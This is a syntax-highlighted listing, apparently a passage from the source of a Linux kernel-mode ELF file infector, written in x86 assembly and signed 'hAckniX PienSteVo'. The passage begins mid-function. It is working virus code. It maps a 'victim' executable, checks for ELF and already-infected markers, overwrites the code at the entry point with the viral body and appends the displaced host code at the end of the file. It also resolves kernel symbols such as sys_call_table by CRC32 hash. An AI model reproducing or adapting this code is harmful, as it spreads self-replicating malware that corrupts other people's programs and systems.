    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">; offset is a long</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">; long...</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KOF</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KOF</span><span class="sc4">+</span><span class="sc5">_LlSeek</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; get file length</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KOF</span><span class="sc4">+</span><span class="sc5">bytes2seek</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; offset = 0</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; map shared = 01h</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; rw = 03h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KOF</span><span class="sc4">+</span><span class="sc5">bytes2seek</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; adr = 0h (auto)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KOF</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KOF</span><span class="sc4">+</span><span class="sc5">_MMap</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; map ze victim!</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFF000h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc5">map_fail</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KOF</span><span class="sc4">+</span><span class="sc5">MapHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc9">%ifdef</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KOF</span><span class="sc4">+</span><span class="sc5">bytes2seek</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@msg_2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"&lt;1&gt;fileLength=%d"</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">@msg_2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KOF</span><span class="sc4">+</span><span class="sc5">_Printk</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc9">%endif</span><span class="sc0">

      </span><span class="sc5">begin_infection</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">464C457Fh</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc5">unmap_spce</span><span class="sc0">     </span><span class="sc1">; is valid elf header ?</span><span class="sc0">

    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; get elf header size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; get entry_point</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; get ph number</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2ah</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; get ph entry size</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                 </span><span class="sc1">; set edi to beginning of</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; program header table</span><span class="sc0">
      </span><span class="sc5">nxt_phdr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">got_phdr</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">nxt_phdr</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">unmap_spce</span><span class="sc0">                          </span><span class="sc1">; there is no valid ph !</span><span class="sc0">

      </span><span class="sc5">got_phdr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; get EIP</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; get offsetsegment file offset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">; save offset from beginnig of psegment</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">; in ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KOF</span><span class="sc4">+</span><span class="sc5">MapHandle</span><span class="sc4">]</span><span class="sc1">; goto EIP in map</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KOF</span><span class="sc4">+</span><span class="sc5">_start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc5">unmap_spce</span><span class="sc0">     </span><span class="sc1">;already infected</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; get segment size</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_end</span><span class="sc4">-</span><span class="sc5">_start</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc5">unmap_spce</span><span class="sc0">     </span><span class="sc1">; sgm too small</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; create a stack frame</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KOF</span><span class="sc4">+</span><span class="sc5">ApiSysBrk</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; dynamically using data space</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">        </span><span class="sc1">; of current process</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">_end</span><span class="sc4">-</span><span class="sc5">_start</span><span class="sc0">  </span><span class="sc1">; allocate _end-_start bytes</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KOF</span><span class="sc4">+</span><span class="sc5">ApiSysBrk</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; (1) save adr of stack frame</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">_end</span><span class="sc4">-</span><span class="sc5">_start</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">; getting allocated space</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">           </span><span class="sc1">; write host code right now!</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">KOF</span><span class="sc4">+</span><span class="sc5">_start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_end</span><span class="sc4">-</span><span class="sc5">_start</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UnMapArea</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">; (1) restore adr of stack frame</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KOF</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">; putting FileHandle-&gt;f_pos</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_start</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">; adr of allocated space</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KOF</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KOF</span><span class="sc4">+</span><span class="sc5">_Write</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; write host cod at EOF</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

    </span><span class="sc9">%ifdef</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@msg2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"&lt;1&gt;%d bytes written"</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">@msg2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KOF</span><span class="sc4">+</span><span class="sc5">_Printk</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc9">%endif</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">map_fail</span><span class="sc0">

      </span><span class="sc5">unmap_spce</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UnMapArea</span><span class="sc0">
      </span><span class="sc5">map_fail</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KOF</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KOF</span><span class="sc4">+</span><span class="sc5">_Close</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
      </span><span class="sc5">open_fail</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; Some UTILZ...                                ;</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; get current task in ring0 mode</span><span class="sc0">
</span><span class="sc5">GetCurrentTask</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xffffe000</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">0xfc</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">0xfc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">leave</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">; unmap mmapped space</span><span class="sc0">
</span><span class="sc5">UnMapArea</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KOF</span><span class="sc4">+</span><span class="sc5">bytes2seek</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KOF</span><span class="sc4">+</span><span class="sc5">MapHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KOF</span><span class="sc4">+</span><span class="sc5">ApiSysMunmap</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; unmap space</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;lSeek fct</span><span class="sc0">
</span><span class="sc5">lSeek</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_seek</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">; return crc32 calculation</span><span class="sc0">
</span><span class="sc1">; little hack of original</span><span class="sc0">
</span><span class="sc1">; this routine work with string like string_R (calculate only crc of string)</span><span class="sc0">
</span><span class="sc1">; as get_kernel_sym return</span><span class="sc0">
</span><span class="sc5">CRC32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">CRC32_init</span><span class="sc0">
      </span><span class="sc5">next_byte</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'_R'</span><span class="sc0">         </span><span class="sc1">;end of ksym?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">finish</span><span class="sc0">

    </span><span class="sc6">lodsb</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">;end of name ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">finish</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
      </span><span class="sc5">next_bit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">no_change</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">CRC32_</span><span class="sc0">
      </span><span class="sc5">no_change</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">next_bit</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next_byte</span><span class="sc0">
      </span><span class="sc5">finish</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">;CRC32 to EAX</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">end_of_host</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; Some DATAZZ...                               ;</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"[hAckniX &lt;@))&gt;&lt; PienSteVo]"</span><span class="sc0">


</span><span class="sc1">;API syscallz</span><span class="sc0">
</span><span class="sc5">ApiSysSethostname</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ApiSysBrk</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ApiSysMunmap</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ApiSysPtrace</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc1">;kernel sym'z</span><span class="sc0">
</span><span class="sc5">@@CRCZ</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">@sys_call_table</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">875d6a47h</span><span class="sc1">;"sys_call_table",0</span><span class="sc0">
</span><span class="sc5">@kmalloc</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">364eb1cfh</span><span class="sc1">;"kmalloc",0</span><span class="sc0">
</span><span class="sc5">@kfree</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0a93c7d3ah</span><span class="sc1">;"kfree",0</span><span class="sc0">
